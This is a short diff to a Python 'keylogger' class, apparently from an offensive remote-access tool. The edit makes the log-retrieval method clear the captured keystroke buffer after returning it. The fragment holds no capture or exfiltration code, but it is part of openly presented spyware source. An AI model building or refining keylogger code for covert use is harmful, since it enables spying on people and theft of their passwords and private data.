@@ -38,5 +38,7 @@ class keylogger:
         elif self.keylogger_log == "":
             return "[-] Keylogger is empty"
         else:
-            return self.keylogger_log
+            data=self.keylogger_log
+            self.keylogger_log=""
+            return data
 
